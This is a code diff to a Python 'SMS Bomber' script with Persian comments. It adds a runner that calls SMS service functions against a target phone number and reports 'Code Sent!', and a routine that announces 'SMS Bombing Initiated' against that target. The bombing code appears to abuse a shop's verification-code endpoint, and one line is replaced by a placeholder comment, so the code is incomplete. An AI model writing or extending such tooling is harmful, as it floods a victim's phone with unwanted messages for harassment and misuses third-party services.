@@ -139,11 +139,25 @@ def khanoumi(phone):
 
 
 # ------------------------------
+# Service Runner
+# ------------------------------
+def send_service_safe(service, phone):
+    """Run SMS service safely with error handling"""
+    try:
+        result = service(phone)
+        if result:
+            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
+        else:
+            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
+    except Exception as e:
+        print(f"{r}[!] Error in {service.__name__}: {e}{a}")
+
+# ------------------------------
 # SMS Bomber
 # ------------------------------
 def Vip(phone, Time):
     services = [khanoumi]  # فقط سرویس khanoumi
-    total_services = len(services)
+    # بقیه کد...
 
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
     print_slow(f"{g}Target: {y}{phone}")
